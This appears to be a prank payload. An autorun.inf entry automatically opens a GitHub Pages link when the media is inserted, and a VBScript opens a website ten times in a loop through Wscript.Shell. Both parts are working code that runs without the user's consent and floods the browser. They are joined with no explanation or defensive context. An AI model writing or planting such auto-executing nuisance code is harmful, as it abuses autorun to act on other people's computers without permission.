[AutoRun]
shellexecute="https://pineappleanicode.github.io/Scrolling-page-useful-link/"


Option Explicit

Dim WSHShell
Set WSHShell=Wscript.CreateObject("Wscript.Shell")

Dim x
For x = 1 to 10
WSHShell.Run "https://instantostrich.com/"
Next
